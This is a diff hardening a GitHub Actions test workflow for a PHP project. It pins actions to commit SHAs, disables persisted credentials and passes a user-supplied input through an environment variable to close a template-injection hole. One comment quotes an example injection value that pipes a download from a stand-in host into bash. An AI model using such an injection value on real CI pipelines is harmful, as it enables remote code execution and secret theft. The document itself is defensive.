@@ -51,9 +51,11 @@ jobs:
       RIVETCORE_PHPUNIT_AUTOLOAD: ${{ github.workspace }}/rivet-core/vendor/autoload.php
 
     steps:
-      - uses: actions/checkout@v7
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+        with:
+          persist-credentials: false
 
-      - uses: shivammathur/setup-php@v2
+      - uses: shivammathur/setup-php@d52fc211a0436f8839a587b3b5b8efddab4744ea # v2
         with:
           php-version: '8.3'
           extensions: mysqli, openssl, mbstring, gd, curl
@@ -62,8 +64,15 @@ jobs:
       # vendor/ is committed to this repository, so the edition itself needs no composer install.
       - name: Resolve the rivet-core ref under test
         id: ref
+        # core_ref is a workflow_dispatch input - a free-text field a caller controls. Passed through env: (the
+        # runner's process environment) rather than interpolated straight into the script body: the ${{ }}
+        # substitution below happened at template-render time, before the shell ever saw it, so a value like
+        # `"; curl evil | bash #` would have run as a second command instead of being treated as plain text.
+        # $CORE_REF_INPUT below is an ordinary shell variable reference - no template substitution, no injection.
+        env:
+          CORE_REF_INPUT: ${{ github.event.inputs.core_ref }}
         run: |
-          REF="${{ github.event.inputs.core_ref }}"
+          REF="$CORE_REF_INPUT"
           if [ -z "$REF" ]; then
             REF="$(php -r '$l = json_decode(file_get_contents("composer.lock"), true); foreach ($l["packages"] as $p) { if ($p["name"] === "rivet/rivet-core") { echo $p["version"]; } }')"
           fi
@@ -71,12 +80,13 @@ jobs:
           echo "rivet-core under test: $REF"
 
       - name: Check out rivet-core (it carries PHPUnit and, from 1.0.0-rc.1, the kit)
-        uses: actions/checkout@v7
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
         with:
           repository: TheTractorHacker/rivet-core
           ref: ${{ steps.ref.outputs.ref }}
           path: rivet-core
           token: ${{ secrets.RIVETCORE_TOKEN || github.token }}
+          persist-credentials: false
 
       - name: Install rivet-core dev dependencies (PHPUnit)
         run: composer install --no-interaction --prefer-dist --working-dir=rivet-core
